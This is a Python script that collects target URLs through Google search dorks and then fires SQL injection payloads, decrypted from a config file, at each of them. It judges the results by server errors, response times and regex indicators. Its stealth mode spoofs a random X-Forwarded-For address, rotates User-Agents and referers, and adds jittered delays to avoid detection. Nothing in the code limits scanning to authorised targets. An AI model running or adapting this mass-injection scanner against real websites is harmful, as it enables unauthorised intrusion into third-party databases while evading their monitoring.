#!/usr/bin/env python3
import os
import re
import sys
import csv
import json
import time
import uuid
import random
import logging
import argparse
import hashlib
import yaml
import requests
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from fake_useragent import UserAgent
from cryptography.fernet import Fernet

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('scanner.log'),
        logging.StreamHandler()
    ]
)

class SecurityScanner:
    def __init__(self, args):
        self.args = args
        self.config = self._load_config()
        self.session = self._init_session()
        self.ua = UserAgent()
        self.cipher = Fernet(self.config['security']['encryption_key'])
        self.payload_db = self._load_payloads()

    def _load_config(self):
        config_path = 'config.yaml'
        if not os.path.exists(config_path):
            raise FileNotFoundError(f"Missing config file: {config_path}")
        
        with open(config_path) as f:
            config = yaml.safe_load(f)
        
        for key in ['security', 'payloads', 'network', 'endpoints']:
            if key not in config:
                raise ValueError(f"Invalid config: Missing '{key}' section")
        
        return config

    def _init_session(self):
        session = requests.Session()
        session.proxies.update(self.config['network'].get('proxies', {}))
        session.headers.update({
            'X-Scanner-ID': hashlib.sha256(uuid.uuid4().bytes).hexdigest()[:16],
            'Accept-Language': 'en-US,en;q=0.9'
        })
        return session

    def _load_payloads(self):
        return {
            dbms: [self.cipher.decrypt(p.encode()).decode() 
                  for p in self.config['payloads'][dbms]]
            for dbms in self.config['payloads']
        }

    def _apply_evasion(self):
        if self.args.stealth:
            delay = self.args.delay + random.uniform(0, self.args.jitter)
            time.sleep(delay)
            
            self.session.headers.update({
                'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
                'Referer': random.choice(self.config['stealth']['referers'])
            })
            
            if self.args.random_agent:
                self.session.headers['User-Agent'] = self.ua.random

    def execute_search(self, query_params):
        try:
            processed_query = self._build_query(query_params)
            return self._fetch_results(processed_query, query_params)
        except Exception as e:
            logging.error(f"Search failure: {str(e)}")
            return []

    def _build_query(self, params):
        base = params['dork']
        if params['site']: base += f" site:{params['site']}"
        if params['file_type']: base += f" filetype:{params['file_type']}"
        return re.sub(r'([\'"])', r'\\\1', base)

    def _fetch_results(self, query, params):
        response = self.session.get(
            self.config['endpoints']['google'],
            params=self._build_api_payload(query, params)
        )
        return self._parse_response(response)

    def _build_api_payload(self, query, params):
        return {
            'q': query,
            'key': self.config['credentials']['api_key'],
            'cx': self.config['credentials']['cse_id'],
            'num': params['max_results'],
            'lr': f"lang_{params['lang']}",
            'cr': params['region'],
            'dateRestrict': params['date_range']
        }

    def _parse_response(self, response):
        return [item['link'] for item in response.json().get('items', [])]

    def perform_scanning(self, targets):
        with ThreadPoolExecutor(max_workers=self.config['performance']['threads']) as executor:
            futures = {executor.submit(self._probe_target, url): url for url in targets}
            return self._process_futures(futures)

    def _probe_target(self, url):
        results = []
        for dbms in self.payload_db:
            random.shuffle(self.payload_db[dbms])
            for payload in self.payload_db[dbms]:
                self._apply_evasion()
                result = self._test_injection(url, payload, dbms)
                if result['vulnerable']: results.append(result)
        return results

    def _test_injection(self, url, payload, dbms):
        try:
            target_url = f"{url}{'&' if '?' in url else '?'}{payload}"
            start = time.time()
            
            response = self.session.get(
                target_url,
                timeout=self.config['network']['timeout'],
                allow_redirects=False
            )
            
            return self._analyze_response(response, payload, dbms, time.time()-start)
        except Exception as e:
            return self._error_result(url, payload, str(e))

    def _analyze_response(self, response, payload, dbms, resp_time):
        indicators = self._detect_indicators(response.text)
        return {
            'vulnerable': self._is_vulnerable(response, resp_time, indicators),
            'url': response.url,
            'payload': self.cipher.encrypt(payload.encode()),
            'dbms': dbms,
            'indicators': indicators,
            'response_time': resp_time
        }

    def _detect_indicators(self, content):
        return [p for p in self.config['detection_patterns'] if re.search(p, content, re.I)]

    def _is_vulnerable(self, response, resp_time, indicators):
        return any([
            response.status_code >= 500,
            resp_time > self.config['stealth']['time_based_threshold'],
            len(indicators) > 0
        ])

    def _process_futures(self, futures):
        results = []
        for future in as_completed(futures):
            try: results.extend(future.result())
            except Exception as e: 
                logging.error(f"Thread error: {str(e)}")
        return results

    def generate_report(self, results, format):
        if format == 'json': 
            self._write_json(results)
        elif format == 'csv': 
            self._write_csv(results)
        else: 
            self._console_output(results)

    def _error_result(self, url, payload, error_msg):
        return {
            'vulnerable': False,
            'url': url,
            'payload': self.cipher.encrypt(payload.encode()),
            'error': error_msg,
            'timestamp': datetime.now().isoformat()
        }

    def _write_json(self, results):
        filename = f"report_{datetime.now().strftime('%Y%m%d%H%M')}.json"
        with open(filename, 'w') as f:
            json.dump(results, f, indent=2)
        logging.info(f"JSON report saved: {filename}")

    def _write_csv(self, results):
        filename = f"report_{datetime.now().strftime('%Y%m%d%H%M')}.csv"
        fieldnames = ['timestamp', 'url', 'dbms', 'payload', 'response_time', 'indicators']
        
        with open(filename, 'w', newline='') as f:
            writer = csv.DictWriter(f, fieldnames=fieldnames)
            writer.writeheader()
            for result in results:
                writer.writerow({
                    'timestamp': datetime.now().isoformat(),
                    'url': result['url'],
                    'dbms': result['dbms'],
                    'payload': self.cipher.decrypt(result['payload']).decode(),
                    'response_time': result['response_time'],
                    'indicators': ";".join(result['indicators'])
                })
        logging.info(f"CSV report saved: {filename}")

    def _console_output(self, results):
        print("\nScan Results:")
        print("-" * 80)
        for result in results:
            status = "VULNERABLE" if result['vulnerable'] else "SAFE"
            print(f"[{status}] {result['url']}")
            print(f"DBMS: {result['dbms']}")
            print(f"Payload: {self.cipher.decrypt(result['payload']).decode()}")
            print("-" * 80)

class ScannerCLI:
    def __init__(self):
        self.parser = self._create_parser()
        self.args = self.parser.parse_args()
        self._validate_args()

    def _create_parser(self):
        parser = argparse.ArgumentParser()
        parser.add_argument('--dork', required=True)
        parser.add_argument('--site')
        parser.add_argument('--file-type')
        parser.add_argument('--lang', default='en')
        parser.add_argument('--region')
        parser.add_argument('--date-range')
        parser.add_argument('--output', choices=['console','json','csv'], default='console')
        parser.add_argument('--max-results', type=int, default=20)
        parser.add_argument('--stealth', action='store_true')
        parser.add_argument('--jitter', type=float, default=0.5)
        parser.add_argument('--delay', type=float, default=1.0)
        parser.add_argument('--random-agent', action='store_true')
        return parser

    def _validate_args(self):
        if not self.args.dork:
            self.parser.error("--dork argument is required")
        
        if self.args.max_results < 1 or self.args.max_results > 100:
            self.parser.error("--max-results must be between 1-100")

    def execute_scan(self):
        try:
            scanner = SecurityScanner(self.args)
            targets = scanner.execute_search({
                'dork': self.args.dork,
                'site': self.args.site,
                'file_type': self.args.file_type,
                'lang': self.args.lang,
                'region': self.args.region,
                'date_range': self.args.date_range,
                'max_results': self.args.max_results
            })
            
            if targets:
                results = scanner.perform_scanning(targets)
                scanner.generate_report(results, self.args.output)
                
        except Exception as e:
            logging.error(f"Critical failure: {str(e)}", exc_info=True)
            sys.exit(1)

if __name__ == '__main__':
    try:
        ScannerCLI().execute_scan()
    except KeyboardInterrupt:
        print("\nScan aborted by user")
        sys.exit(130)
